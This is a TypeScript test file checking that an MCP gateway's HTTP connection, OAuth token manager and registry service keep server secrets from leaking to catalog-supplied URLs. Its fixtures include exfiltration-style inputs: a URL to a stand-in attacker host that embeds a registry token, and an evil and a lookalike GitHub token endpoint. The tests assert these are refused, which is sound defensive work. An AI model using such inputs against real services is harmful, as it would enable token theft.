import { describe, it, expect, vi, afterEach } from 'vitest';
import { HttpMcpConnection } from '../../src/downstream/http-connection.js';
import { OAuthTokenManager } from '../../src/services/oauth-token-manager.js';
import { RegistryService } from '../../src/services/registry-service.js';

// TD-027: server secrets must not be reachable by catalog-supplied URLs or OAuth env var names.

const SECRET = 'td027-secret-value';

afterEach(() => {
  vi.restoreAllMocks();
  delete process.env.REGISTRY_TOKEN;
  delete process.env.TD027_CLIENT_ID;
});

describe('http-connection URL expansion (TD-027 / B1)', () => {
  it('does not expand ${VAR} from process.env', () => {
    process.env.REGISTRY_TOKEN = SECRET;
    const conn = new HttpMcpConnection({
      name: 'x',
      transport: 'http',
      url: 'https://evil.example/x?t=${REGISTRY_TOKEN}',
    } as never);
    const url = (conn as unknown as { resolveUrl(): string }).resolveUrl();
    expect(url).not.toContain(SECRET);
    expect(url).toContain('${REGISTRY_TOKEN}');
  });

  it('still expands ${VAR} from config.env', () => {
    const conn = new HttpMcpConnection({
      name: 'x',
      transport: 'http',
      url: 'https://ok.example/x?k=${API_KEY}',
      env: { API_KEY: 'per-user' },
    } as never);
    expect((conn as unknown as { resolveUrl(): string }).resolveUrl()).toBe(
      'https://ok.example/x?k=per-user'
    );
  });
});

describe('OAuthTokenManager client secrets (TD-027 / B2)', () => {
  const oauth = (over: Record<string, string> = {}) =>
    ({
      auth_url: 'https://github.com/login/oauth/authorize',
      token_url: 'https://github.com/login/oauth/access_token',
      scopes: 'repo',
      client_id_env: 'TD027_CLIENT_ID',
      client_secret_env: 'GITHUB_OAUTH_CLIENT_SECRET',
      ...over,
    }) as never;

  const mgr = () =>
    new OAuthTokenManager({
      db: {} as never,
      vault: {} as never,
      callbackBaseUrl: 'https://x',
      clientSecrets: {
        GITHUB_OAUTH_CLIENT_SECRET: { value: SECRET, allowedTokenHosts: ['github.com'] },
      },
    });

  it('refuses client_secret_env naming a non-registered var (e.g. REGISTRY_TOKEN)', async () => {
    process.env.TD027_CLIENT_ID = 'cid';
    process.env.REGISTRY_TOKEN = SECRET;
    const f = vi.spyOn(globalThis, 'fetch');
    await expect(
      mgr().refreshAccessToken(oauth({ client_secret_env: 'REGISTRY_TOKEN' }), 'rt')
    ).rejects.toThrow(/not available/);
    expect(f).not.toHaveBeenCalled();
  });

  it('refuses the GitHub secret for a non-github.com token_url', async () => {
    process.env.TD027_CLIENT_ID = 'cid';
    const f = vi.spyOn(globalThis, 'fetch');
    await expect(
      mgr().refreshAccessToken(oauth({ token_url: 'https://evil.example/token' }), 'rt')
    ).rejects.toThrow(/not permitted/);
    expect(f).not.toHaveBeenCalled();
  });

  it('refuses lookalike hosts', async () => {
    process.env.TD027_CLIENT_ID = 'cid';
    const f = vi.spyOn(globalThis, 'fetch');
    await expect(
      mgr().refreshAccessToken(oauth({ token_url: 'https://github.com.evil.example/t' }), 'rt')
    ).rejects.toThrow(/not permitted/);
    expect(f).not.toHaveBeenCalled();
  });

  it('sends the GitHub secret to github.com', async () => {
    process.env.TD027_CLIENT_ID = 'cid';
    const f = vi
      .spyOn(globalThis, 'fetch')
      .mockResolvedValue(
        new Response(JSON.stringify({ access_token: 'at', token_type: 'bearer' }), { status: 200 })
      );
    await mgr().refreshAccessToken(oauth(), 'rt');
    expect(String(f.mock.calls[0]![0])).toBe('https://github.com/login/oauth/access_token');
    expect(String((f.mock.calls[0]![1] as RequestInit).body)).toContain(`client_secret=${SECRET}`);
  });
});

describe('registry fetch stays authenticated (TD-027)', () => {
  it('sends the captured token as Authorization', async () => {
    const f = vi
      .spyOn(globalThis, 'fetch')
      .mockResolvedValue(new Response('servers: []', { status: 200 }));
    const svc = new RegistryService(
      { url: 'https://api.github.com/x', refreshIntervalHours: 24, enabled: true, token: SECRET },
      {} as never
    );
    await svc.fetchRegistry().catch(() => undefined); // body validity is irrelevant here
    const headers = (f.mock.calls[0]![1] as RequestInit).headers as Record<string, string>;
    expect(headers['Authorization']).toBe(`token ${SECRET}`);
  });
});
